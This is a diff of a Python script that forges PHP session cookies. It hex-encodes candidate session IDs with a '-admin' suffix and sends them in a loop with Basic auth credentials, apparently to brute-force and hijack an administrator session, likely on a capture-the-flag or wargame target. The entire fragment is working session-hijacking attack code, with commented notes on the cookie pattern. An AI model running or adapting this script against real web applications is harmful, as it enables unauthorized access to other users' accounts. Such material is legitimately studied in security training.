@@ -13,8 +13,8 @@ headers = {'Authorization': 'Basic %s' % userAndPass}
 
 
 def injectCookie(username, sessionid):
-    cookie_sessionid = str(sessionid)+'-'+username
-    cookie_sessionid = cookie_sessionid.encode('utf-8').hex()
+    prefix = ''.join(['3'+c for c in str(sessionid)])
+    cookie_sessionid = f"{prefix}2d61646d696e"
     print("sending %s" % cookie_sessionid)
     res = requests.get(url, headers=headers, cookies={'PHPSESSID': cookie_sessionid })
     return res
@@ -35,6 +35,9 @@ while idx < 640:
     #resp = createCookie('admin')
     #val = resp.cookies['PHPSESSID']
     #print("hex: %s, dec: %s" % (val, bytes.fromhex(val).decode('utf-8')))
+    #print("%s" % (val))
+
+    #3_3_(?3_)2d61646d696e
 
     sleep(0.3)
 
